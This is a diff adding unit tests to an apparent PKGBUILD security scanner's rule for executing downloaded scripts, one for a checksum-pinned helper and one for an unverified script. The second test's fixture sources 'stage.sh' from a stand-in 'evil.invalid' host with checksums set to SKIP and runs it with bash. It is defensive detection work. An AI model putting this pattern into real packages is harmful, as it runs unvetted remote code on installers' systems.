@@ -61,6 +61,31 @@ def test_build_context_computes_the_shared_facts():
     assert ctx.scopes is not None
 
 
+def test_h083_ignores_a_checksum_pinned_declared_script():
+    """pkl-lsp: prepare() runs merge-lsp4j-metadata.py, a declared source
+    pinned by a real sha512.  The pinned bytes are what the packager
+    vetted, so executing the helper is packaging, not remote code."""
+    body = (
+        "source=(\"https://example.invalid/merge.py\" \"x.tar.gz\")\n"
+        "sha512sums=('" + "a" * 128 + "' '" + "b" * 128 + "')\n"
+        "prepare() {\n"
+        "  python3 \"$srcdir/merge.py\"\n"
+        "}\n"
+    )
+    assert "H083" not in _ids(body)
+
+
+def test_h083_fires_on_a_skip_pinned_declared_script():
+    body = (
+        "source=(\"https://evil.invalid/stage.sh\")\n"
+        "sha256sums=('SKIP')\n"
+        "prepare() {\n"
+        "  bash \"$srcdir/stage.sh\"\n"
+        "}\n"
+    )
+    assert "H083" in _ids(body)
+
+
 def test_unread_execution_predicate_fires_in_package_scope():
     assert "H094" in _ids("package() {\n  ./x.sh\n}\n")
 
